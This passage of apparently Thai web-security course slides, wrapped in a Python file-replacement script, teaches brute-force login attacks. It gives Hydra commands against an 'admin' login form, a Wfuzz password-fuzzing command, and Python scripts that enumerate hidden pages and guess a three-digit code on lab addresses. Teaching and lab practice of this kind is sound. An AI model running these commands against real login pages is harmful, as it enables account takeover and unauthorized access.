<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Credential Stuffing</td>
<td style="padding: 10px;">นำรายชื่อบัญชีและรหัสผ่านคู่ที่หลุดรั่วออกมาในสากลโลก (Data Breaches) มาทดลองเปิดใช้กับเป้าหมาย</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Reverse Brute Force</td>
<td style="padding: 10px;">ใช้รหัสผ่านยอดฮิตค่าเดียว (เช่น <code>password123</code>, <code>123456</code>) ไล่ล็อกอินสุ่มกับชื่อบัญชีผู้ใช้หลายหมื่นรายชื่อ</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 196-200: Brute Force Tool: Hydra (โปรแกรมสุ่มล็อกอินความเร็วสูง)
**Hydra** คือหนึ่งในสุดยอดโปรแกรมรันสุ่มกุญแจความมั่นคงและบัญชีผ่านเครือข่ายบรรทัดคำสั่งที่รวดเร็วที่สุด:
- รองรับการสแกนผ่านหลายโปรโตคอลระบบ เช่น HTTP, SSH, FTP, Telnet, SMB เป็นต้น
- **รูปแบบคำสั่งการรันเดารหัสผ่านหน้าเว็บ**:

```bash
# 🟢 1. การเดาข้อมูลล็อกอินแบบส่งพารามิเตอร์ผ่าน GET Method
hydra -l admin -P /path/to/passwords.txt http-get://target.com/login.php

# 🔴 2. การเดาข้อมูลล็อกอินแบบส่งผ่านแบบฟอร์ม POST Form Method
hydra -l admin -P /path/to/passwords.txt http-post-form \\
  "/login.php:username=^USER^&password=^PASS^:F=Invalid login"
```
- **ความหมายของสัญลักษณ์ควบคุม**:
  - `-l admin`: ระบุบัญชีเป้าหมายที่เจาะจงโจมตีเป็นชื่อ "admin"
  - `-P /path/to/passwords.txt`: แนบพาธคลังไฟล์รหัสผ่านที่เตรียมมาทดลองสุ่ม
  - `http-post-form`: กำหนดชนิดโปรโตคอลสำหรับการกรอกโพสต์ฟอร์มเว็บ
  - `^USER^` / `^PASS^`: ตัวแปรที่ระบบจะส่งรายชื่อและรหัสผ่านจากรายการเข้าไปแทนที่ทีละคำ
  - `F=Invalid login`: ประโยคแจ้งผลการล็อกอินล้มเหลว (Failure Message) ที่ปรากฏหน้าจอ เพื่อให้โปรแกรมแยกแยะได้ว่าคำตอบใดผิด

---

### 📄 SLIDE 201-203: Web Fuzzing by Wfuzz
**Wfuzz** คือเครื่องมือสแกนหาไดเรกทอรีและทดสอบยิงพารามิเตอร์ดิบผ่านเว็บเบราว์เซอร์ โดยจะนำอินพุตมาสลับสอดแทรกแทนที่ตำแหน่งคีย์เวิร์ดคำว่า `FUZZ`:
```bash
wfuzz -c -z file,/path/to/passwords.txt --hc 404 \\
  http://target.com/login.php?username=admin&password=FUZZ
```
- **ความหมายออปชัน**:
  - `-c`: แสดงผลลัพธ์เป็นสีเพื่อให้อ่านข้อมูลล็อกอินได้ง่ายขึ้น
  - `-z file,...`: นำคลังไฟล์รหัสผ่านหรือเวิร์ดลิสต์มาใช้อ้างอิง
  - `--hc 404`: สั่งละเว้นการแสดงผลรหัสการขอเว็บที่เป็นความผิดพลาด 404 (Ignored Response Codes)

---

### 📄 SLIDE 204-207: Python Scripts for Web Brute Force (GET requests)
นอกเหนือจากการใช้โปรแกรมสำเร็จรูป นักพัฒนาและแฮกเกอร์มักเขียนสคริปต์ภาษา Python โดยใช้งานไลบรารี `requests` เพื่อประมวลผลเงื่อนไขการสุ่มหาแบบรวดเร็วและสามารถคัดกรองข้อมูลเองได้:

#### 🐍 1. ตัวอย่างสคริปต์สุ่มหาหน้าเว็บเพจที่ถูกซ่อนไว้ตามลำดับตัวเลข
```python
import requests

# ทำการรันวนลูปตัวเลขตั้งแต่ 1000 ถึง 9000 เพื่อสุ่มหาหน้าเว็บที่เปิดใช้งานจริง
for i in range(1000, 9000):
    url = 'http://172.19.19.129:8000/dakw/'
    link = url + 'room' + str(i) + '.html'
    
    # ส่งคำสั่งขอหน้าเว็บด้วย GET method
    web = requests.get(link)
    html = web.text
    
    # ตรวจสอบการโหลดหน้าเพจ หากไม่ปรากฏข้อความผิดพลาด ให้แสดง URL
    if 'Not Found' not in html:
        print("[FOUND] -> " + link)
```

#### 🐍 2. ตัวอย่างการสุ่มเลขที่ระบุจัดระเบียบเลขศูนย์นำหน้า (Zero-padded IDs)
```python
import requests

# รันลูปหาหน้าที่เก็บไฟล์ข้อมูล ID ลำดับที่ 6 ถึง 500
for i in range(6, 500):
    # สั่งจัดรูปแบบให้ตัวเลขมีความยาวเท่ากับ 5 หลักเสมอ เช่น 00006, 00007...
    link = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    
    web = requests.get(link)
    html = web.text
    
    # หากไม่พบประโยคความผิดพลาด 404 แสดงว่าหน้าเอกสารมีความลับอยู่จริง
    if html.find('404 Not Found') == -1:
        print("[FOUND PADDING] -> " + link)
```

---

### 📄 SLIDE 208-210: Python Scripts for Web Brute Force (POST requests & Lottery)

#### 🐍 1. ตัวอย่างสคริปต์ส่งคำสั่งประมวลผลข้อมูลผ่าน POST requests
```python
import requests

for i in range(501, 10000):
    link = 'http://172.19.19.129:8003/new/'
    
    # เตรียมข้อมูลที่จัดรูปแบบเพื่อส่งไปโพสต์ลงฟอร์ม
    s = 'Test' + str(i).zfill(5)
    
    # ส่งชุดพารามิเตอร์แบบ POST request
    web = requests.post(link, { 'title': s, 'message': s })
    
    # ยิงทดสอบเช็คหน้าที่สร้างเสร็จสิ้นทันที
    link_page = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    web_check = requests.get(link_page)
    html = web_check.text
    
    # ตรวจเช็คผลลัพธ์การจัดเก็บ
    if html.find('404 Not Found') >= 0:
        print("[COMPLETED POST VERIFY] -> " + link)
        break
```

#### 🐍 2. ตัวอย่างการเขียนสคริปต์ไขรหัสผ่าน/เลขอัตโนมัติ (Lottery / Digit Brute Force)
สคริปต์รันวนซ้อนแบบ nested loops เพื่อสุ่มเดาตัวเลข 3 หลัก (000 - 999) ในการส่งประเมินผล:
```python
import requests

def loop():
    # ลูปตัวเลขหลักที่หนึ่ง สอง และสามทีละค่า
    for a in range(10):
        for b in range(10):
            for c in range(10):
                # โพสต์ชุดตัวเลขที่สลับไปหาฟอร์มวิเคราะห์ผลลัพธ์หลังบ้าน
                web = requests.post('http://172.19.19.129:8000/ecxb/index.php',
                                    {'digit1': a, 'digit2': b, 'digit3': c})
                html = web.text
                
                # แสดงความคืบหน้าของตัวเลขปัจจุบันออกหน้าจอ
                print("[TESTING DIGIT] -> " + str(a) + str(b) + str(c))
                
                # หากเงื่อนไขในเว็บไม่ปรากฏข้อความล้มเหลว แสดงว่าเราทายเลขถูกต้อง
                if 'Unlucky Lottery' not in html:
                    print("[WINNER COMBINATION FOUND!] -> " + str(a) + str(b) + str(c))
                    return
loop()
```
\"\"\"
"""

# Perform replacement
new_code = code[:start_idx] + new_val179_0 + code[end_idx:]

with open(file_path, "w", encoding="utf-8") as f:
    f.write(new_code)

print("Replacement successful!")
